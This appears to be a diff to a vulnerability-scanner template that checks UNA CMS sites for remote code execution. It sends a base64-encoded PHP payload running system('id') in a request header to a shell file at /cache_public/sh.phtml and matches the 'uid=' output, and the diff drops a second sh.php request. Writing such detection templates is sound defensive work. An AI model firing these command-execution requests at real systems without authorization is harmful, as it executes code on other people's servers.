@@ -20,6 +20,7 @@ info:
   tags: php,rce,una-cms,vuln
 variables:
   cmd: echo '{{randstr}}'. system('id') . '{{randstr}}';
+flow: http(1) && http(2)
 http:
   - matchers:
       - internal: true
@@ -40,7 +41,7 @@ http:
         name: id
         part: body
         regex:
-          - '{{randstr}}(.*){{randstr}}'
+          - (?s){{randstr}}(.*?){{randstr}}
         # digest: 4a0a00473045022047995af54a3371a7a874a1ac349eb0848a9496987f029d6698a23a2519180539022100d347678463eaccb7195ee39e5c53924c899614324eba2610052e52097e4ce846:922c64590222798bb761d5b6d8e72950
 
         type: regex
@@ -49,19 +50,15 @@ http:
         part: body
         type: word
         words:
-          - Expires
-          - Value
+          - '{{randstr}}'
           - uid=
-          - groups=
+      - status:
+          - 200
+        type: status
+    matchers-condition: and
     raw:
       - |
         GET /cache_public/sh.phtml HTTP/1.1
         Host: {{Hostname}}
         X-Requested-With: XMLHttpRequest
         X: {{base64(cmd)}}
-      - |
-        GET /cache_public/sh.php HTTP/1.1
-        Host: {{Hostname}}
-        X-Requested-With: XMLHttpRequest
-        X: {{base64(cmd)}}
-    stop-at-first-match: true
